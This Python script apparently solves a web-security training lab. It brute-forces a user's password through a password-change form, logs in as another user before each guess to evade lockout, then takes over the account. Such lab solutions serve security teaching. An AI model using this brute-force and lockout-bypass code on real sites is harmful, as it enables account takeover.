######################################################################
#
# Lab: Password brute-force via password change
#
# Hack Steps: 
#      1. Read password list
#      2. Brute force carlos password via password change 
#         functionality and change his password (login as wiener 
#         before every try to bypass blocking)
#      3. Wait 1 minute to bypass blocking
#      4. Login as carlos with the new password
#
######################################################################
import requests
import time
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6f0079035e214680c0d5eb00a5000a.web-security-academy.net"

NEW_CARLOS_PASSWORD = "Hacked"; # You can change this to what you want

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Brute forcing carlos password..")

    is_found = brute_force_password(password_list)
    
    if is_found:
        print(Fore.WHITE + "⦗3⦘ Waiting 1 minute to bypass blocking.. ", end="", flush=True)
        time.sleep(60)

        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗4⦘ Logging in as carlos with the new password.. ", end="", flush=True)
    
        login_as_carlos = login("carlos", NEW_CARLOS_PASSWORD)
        session = login_as_carlos.cookies.get("session")
        cookies = { "session": session }
        fetch("/my-account", cookies)

        print_finish_message()

    else:
        print(Fore.RED + "⦗!⦘ No valid passwords was found")


def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def brute_force_password(password_list):
    passwords_count = len(password_list)

    for (counter, password) in enumerate(password_list):
        login_as_wiener = login("wiener", "peter")
        
        session = login_as_wiener.cookies.get("session")  
        change_password = change_carlos_password(session, password)  
        
        if change_password.status_code == 200:
            print_correct_password(password)
            return True
        else:
            print_progress(counter, passwords_count, password)

    return False


def login(username, password):
    data = { "username": username, "password": password }
    try:
        return requests.post(f"{LAB_URL}/login", data, allow_redirects=False)
    except:
        print(Fore.RED + "Failed to login as wiener through exception")


def change_carlos_password(session, current_password):
    data = { "username": "carlos", "current-password": current_password,
            "new-password-1": NEW_CARLOS_PASSWORD,
            "new-password-2": NEW_CARLOS_PASSWORD }
    cookies = { "session": session }
    try:
        return requests.post(f"{LAB_URL}/my-account/change-password", data, cookies=cookies, allow_redirects=False)    
    except:
        print(Fore.RED + "Failed change password request through exception")
        exit(1)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def print_correct_password(password):
    print(Fore.WHITE + f"\n🗹 Correct password: " + Fore.GREEN + password)
    print(Fore.WHITE + f"🗹 Password was changed to: " + Fore.GREEN + NEW_CARLOS_PASSWORD)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME)))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    print(Fore.GREEN + "OK")
    elapsed_time = int((time.time() - SCRIPT_START_TIME))  
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + " seconds")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()